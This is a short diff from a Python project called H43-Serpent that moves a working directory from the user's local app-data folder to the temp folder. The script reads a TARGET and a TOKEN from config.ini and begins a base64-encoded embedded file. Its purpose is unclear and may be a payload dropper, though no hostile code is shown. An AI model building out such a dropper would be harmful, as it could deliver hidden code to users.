@@ -17,6 +17,7 @@ REPO: https://github.com/Fytex/H43-Serpent
 import os
 import sys
 import base64
+import tempfile
 import importlib
 import configparser
 
@@ -32,7 +33,7 @@ config.read('config.ini')
 TARGET = config['CONFIGS']['TARGET']
 TOKEN = config['CONFIGS']['TOKEN']
 
-d = os.getenv("LOCALAPPDATA")
+d = tempfile.gettempdir()
 
 
 file_base64_content = '''\'\'\'
